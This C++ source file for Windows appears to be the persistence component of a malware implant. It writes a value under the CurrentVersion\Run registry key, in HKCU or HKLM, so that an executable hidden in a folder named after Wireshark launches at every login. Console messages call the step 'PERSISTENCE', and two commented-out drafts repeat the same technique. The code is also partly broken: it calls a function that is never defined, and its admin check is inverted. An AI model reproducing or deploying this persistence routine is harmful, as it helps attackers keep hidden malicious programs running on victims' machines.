
#include <windows.h>
#include <Winerror.h>
#include <iostream>
#include <string>

using namespace std;

int main(int argc,char** argv)
{   
    string path_prog = "C:\\Users\\cisco\\AppData\\Roaming\\Wireshark\\12.exe\0"; //don't forget "\0"
    LPCTSTR value = TEXT("testjuan"); 
    HKEY hKey;
    LONG status;
    bool error = false;
    bool a_is_admin = false;
    cout <<"PERSI MAIN: " << path_prog << endl;
    if(a_is_admin) //if admin
    {  
        if(long statusOpen = RegOpenKeyEx(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
        &hKey) == ERROR_SUCCESS) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
        {
            cout << "OPEN KEY is admin: " << endl;
            cout << "Value of key: " << value << endl;
            status = RegSetValueEx(hKey,value ,0 , REG_SZ, (LPBYTE)path_prog.c_str(),strlen(path_prog.c_str())+1);
            if(status == ERROR_SUCCESS)
            {
                cout << "[+] Key ok." << endl;
            }
            else
            {
                cout << "[-] Key not found " << endl;
                error = true;
            }
            
            cout <<"Status: " <<statusOpen << endl;
            RegCloseKey(hKey);   
            cout << "KEY CLOSED" << endl;
        }
        else
        {
            cout << statusOpen << endl;
            cout <<"ERROR not opend key !" << endl;
            error = true;
        }
    }
    else
    {
        if(long statusOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
        &hKey) == ERROR_SUCCESS) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
        {
            cout << "OPEN KEY not admin: " << endl;
            status = RegSetValueEx(hKey,value ,0 , REG_SZ, (LPBYTE)path_prog.c_str(),strlen(path_prog.c_str())+1);
            cout <<"Status: " <<statusOpen << endl;
            if(status == ERROR_SUCCESS)
            {
                cout << "[+] Key ok." << endl;
            }
            else
            {
                cout << "[-] Key not found " << endl;
                error = true;
            }
            RegCloseKey(hKey);   
            cout << "KEY CLOSED" << endl;
        }
        else
        {
            cout << statusOpen << endl;
            cout <<"ERROR not opend key !" << endl;
            error = true;
        }
    }
    //If error start default persi
    if(error)
    {
        cout << "ERROR GO TO DEFAULT PERSI " << endl;
        defaultPersi();
    }

    cout << "[+] PERSISTENCE FINISH " << endl;
    system("PAUSE");
    return 0;
}
    
    /*
    string a_path_prog = "C:\\Users\\cisco\\AppData\\Roaming\\Wireshark\\12.exe";
    bool a_is_admin = false;
    string path_prog =  a_path_prog + "\0"; //don't forget "\0"
    LPCTSTR value = TEXT("TESTkey"); 
    HKEY hKey;
    LONG status;
    bool error = false;
    
    if(a_is_admin) //if admin
    {  
        if(long statusOpen = RegOpenKeyEx(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
        &hKey) == ERROR_SUCCESS) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
        {
            cout << "OPEN KEY is admin: " << endl;
            cout << "Value of key: " << value << endl;
            status = RegSetValueEx(hKey,value ,0 , REG_SZ, (LPBYTE)path_prog.c_str(),strlen(path_prog.c_str())+1);

            if(status == ERROR_SUCCESS)
            {
                cout << "[+] Key ok." << endl;
            }
            else
            {
                cout << "[-] Key not found " << endl;
                error = true;
            }
            
            cout <<"Status: " <<statusOpen << endl;
            RegCloseKey(hKey);   
            cout << "KEY CLOSED" << endl;
        }
        else
        {
            cout << statusOpen << endl;
            cout <<"ERROR not opend key !" << endl;
            error = true;
        }
    }
    else
    {
        if(long statusOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
        &hKey) == ERROR_SUCCESS) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
        {
            cout << "OPEN KEY not admin: " << endl;
            status = RegSetValueEx(hKey,value ,0 , REG_SZ, (LPBYTE)path_prog.c_str(),strlen(path_prog.c_str())+1);

            cout <<"Status: " <<statusOpen << endl;
            RegCloseKey(hKey);   
            cout << "KEY CLOSED" << endl;
            if(status == ERROR_SUCCESS)
            {
                cout << "[+] Key ok." << endl;
            }
            else
            {
                cout << "[-] Key not found " << endl;
                error = true;
            }
        }
        else
        {
            cout << statusOpen << endl;
            cout <<"ERROR not opend key !" << endl;
            error = true;
        }

        if(error)
        {
            cout <<"ONE ERROR" << endl;
        }
    }
    */
    /*
    string path_prog = "C:\\Users\\cisco\\AppData\\Roaming\\Wireshark\\12.exe";
    path_prog += "\0";
    system("PAUSE");
    LPCTSTR value = TEXT("persitest"); //une autre variable DWORD qui représente la taille (en octets) du tampon de sortie écrit par RegGetValues    

    HKEY hKey;
    LONG status;

    if(long test = RegOpenKeyEx(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
    &hKey) == ERROR_SUCCESS) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
    {
        cout << "OPEN KEY" << endl; 
        status = RegSetValueEx(hKey,value ,0 , REG_SZ, (LPBYTE)path_prog.c_str(),strlen(path_prog.c_str())+1);
        cout <<"Stataus: " <<status << endl;
        RegCloseKey(hKey);   
    }
    else
    {
        cout << test << endl;
        cout <<"ERROR" << endl;
    }
    system("PAUSE");
    */